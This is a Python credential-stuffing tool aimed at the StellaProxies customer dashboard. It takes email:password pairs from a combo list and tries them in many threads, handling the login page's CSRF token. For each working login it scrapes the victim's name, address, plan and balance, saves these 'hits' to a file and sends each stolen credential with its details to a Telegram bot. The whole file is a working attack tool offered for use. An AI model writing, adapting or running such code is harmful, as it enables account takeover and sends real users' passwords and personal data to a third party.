import requests
import re
import threading
import time
import os
import sys
from bs4 import BeautifulSoup
from datetime import datetime
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

# Initialize colorama
init()

# Configuration
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
LOGIN_URL = "https://dash.stellaproxies.com/index.php?rp=/login"
DASHBOARD_URL = "https://dash.stellaproxies.com/index.php?rp=/dashboard"

# Global variables
valid_accounts = []
lock = threading.Lock()
stats = {"valid": 0, "invalid": 0, "errors": 0, "checked": 0}
total_accounts = 0
progress_bar = None

def colored(text, color):
    return f"{color}{text}{Style.RESET_ALL}"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(colored(r"""
   _____ _           _    ______ _               _    
  / ____| |         | |  |  ____| |             | |   
 | (___ | |__   ___ | | _| |__  | | __ _ _ __ __| |___ 
  \___ \| '_ \ / _ \| |/ /  __| | |/ _` | '__/ _` / __|
  ____) | | | | (_) |   <| |____| | (_| | | | (_| \__ \
 |_____/|_| |_|\___/|_|\_\______|_|\__,_|_|  \__,_|___/
    """, Fore.CYAN))
    print(colored(f"⚡ ULTRA-FAST STELLAPROXIES CHECKER ⚡", Fore.MAGENTA))
    print(colored(f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", Fore.YELLOW))
    print(colored("=" * 80, Fore.BLUE))
    print_report()

def print_report():
    with lock:
        checked = stats["checked"]
        valid = stats["valid"]
        invalid = stats["invalid"]
        errors = stats["errors"]
        
        if total_accounts > 0:
            percent = (checked / total_accounts) * 100
            progress = f"[{'#' * int(percent/2)}{' ' * (50 - int(percent/2))}]"
            print(colored(f"\n📊 PROGRESS: {percent:.1f}% {progress}", Fore.GREEN))
            print(colored(f"🔍 Checked: {checked}/{total_accounts} | ✅ Valid: {valid} | ❌ Invalid: {invalid} | ⚠ Errors: {errors}", Fore.WHITE))
            print(colored("=" * 80 + "\n", Fore.BLUE))

def send_telegram(message):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "disable_notification": True,
                "parse_mode": "HTML"
            },
            timeout=5
        )
    except:
        pass

def extract_account_data(session):
    try:
        response = session.get(DASHBOARD_URL, timeout=15)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        data = {}
        
        # Extract basic info
        profile = soup.find('div', class_='profile-card')
        if profile:
            data['Username'] = profile.find('strong').text.strip() if profile.find('strong') else "N/A"
            lines = [line.strip() for line in profile.stripped_strings][1:]
            if len(lines) >= 2:
                data['Name'] = lines[0]
                data['Address'] = lines[1]
        
        # Extract table data
        for table in soup.find_all('table', class_='table'):
            for row in table.find_all('tr'):
                cols = row.find_all('td')
                if len(cols) == 2:
                    key = cols[0].text.strip().replace(':', '')
                    value = cols[1].text.strip()
                    data[key] = value
        
        # Extract plan and balance
        if plan := soup.find('div', class_='plan-info'):
            data['Plan'] = plan.text.strip()
        
        if balance := soup.find('div', class_='credit-balance'):
            data['Balance'] = balance.text.strip()
        
        return data
    
    except Exception as e:
        return {"Error": str(e)}

def check_account(email, password):
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'Origin': 'https://dash.stellaproxies.com',
            'Referer': LOGIN_URL
        })
        
        # Get CSRF token
        response = session.get(LOGIN_URL)
        if token := re.search(r'name="token" value="([^"]+)"', response.text):
            token = token.group(1)
        else:
            return False
        
        # Login attempt
        response = session.post(LOGIN_URL, data={
            'token': token,
            'username': email,
            'password': password,
            'rememberme': 'on'
        }, allow_redirects=True, timeout=15)
        
        # Check login success
        success = "dashboard" in response.url or "logout" in response.text
        
        if success:
            account_data = extract_account_data(session)
            
            with lock:
                valid_accounts.append({
                    'email': email,
                    'password': password,
                    'data': account_data
                })
                stats["valid"] += 1
                stats["checked"] += 1
            
            # Send to Telegram in background
            threading.Thread(target=send_telegram, args=(format_report(email, password, account_data),)).start()
            return True
        
        with lock:
            stats["invalid"] += 1
            stats["checked"] += 1
        return False
    
    except Exception as e:
        with lock:
            stats["errors"] += 1
            stats["checked"] += 1
        return False

def format_report(email, password, data):
    report = f"<b>🔥 NEW ACCOUNT HIT 🔥</b>\n\n"
    report += f"<b>📧 Email:</b> <code>{email}</code>\n"
    report += f"<b>🔑 Password:</b> <code>{password}</code>\n\n"
    report += "<b>📊 Account Details:</b>\n"
    
    for key, value in data.items():
        if value and value != "N/A":
            report += f"• <b>{key}:</b> {value}\n"
    
    report += f"\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    return report

def save_results():
    with open("hits.txt", "a", encoding="utf-8") as f:
        for account in valid_accounts:
            report = format_report(account['email'], account['password'], account['data'])
            f.write(report.replace('<b>', '').replace('</b>', '').replace('<code>', '').replace('</code>', '') + "\n\n")

def worker(email, password):
    result = check_account(email, password)
    print_banner()  # Update the console output
    return result

def get_user_input():
    print(colored("\n⚙ CONFIGURATION SETTINGS ⚙", Fore.YELLOW))
    print(colored("-" * 80, Fore.BLUE))
    
    threads = input(colored("Enter number of threads (50-500 recommended): ", Fore.CYAN))
    workers = input(colored("Enter number of workers (1-10 recommended): ", Fore.CYAN))
    bots = input(colored("Enter number of Telegram bots to use (1-3 recommended): ", Fore.CYAN))
    
    try:
        threads = int(threads) if threads else 100
        workers = int(workers) if workers else 3
        bots = int(bots) if bots else 1
    except:
        print(colored("Invalid input! Using default values.", Fore.RED))
        threads, workers, bots = 100, 3, 1
    
    return threads, workers, bots

def main():
    global total_accounts
    
    # Get user configuration
    max_threads, workers, bots = get_user_input()
    
    # Count total accounts first
    try:
        with open("combo.txt", "r", encoding="utf-8") as f:
            total_accounts = sum(1 for line in f if ":" in line)
    except:
        print(colored("[!] combo.txt file not found or invalid", Fore.RED))
        return
    
    print_banner()
    
    # Process accounts
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = []
        
        with open("combo.txt", "r", encoding="utf-8") as f:
            for line in f:
                if ":" in line:
                    email, password = line.strip().split(":", 1)
                    futures.append(executor.submit(worker, email, password))
                    
                    # Limit active threads
                    while threading.active_count() > max_threads:
                        time.sleep(0.01)
    
    # Wait for all tasks to complete
    for future in futures:
        future.result()
    
    save_results()
    
    # Final report
    print_banner()
    print(colored("\n🎉 CHECKING COMPLETED!", Fore.GREEN))
    print(colored(f"✅ Valid accounts: {stats['valid']}", Fore.GREEN))
    print(colored(f"❌ Invalid accounts: {stats['invalid']}", Fore.RED))
    print(colored(f"⚠ Errors encountered: {stats['errors']}", Fore.YELLOW))
    print(colored(f"\n💾 Results saved to hits.txt", Fore.CYAN))
    
    # Send final report to Telegram
    if valid_accounts:
        final_report = f"<b>✅ CHECKER FINISHED</b>\n\n"
        final_report += f"<b>🟢 Valid:</b> {stats['valid']}\n"
        final_report += f"<b>🔴 Invalid:</b> {stats['invalid']}\n"
        final_report += f"<b>⚡ Hits saved:</b> {len(valid_accounts)}\n"
        final_report += f"<b>⏰ Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        send_telegram(final_report)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n🛑 Process interrupted by user!", Fore.RED))
        save_results()
        sys.exit(0)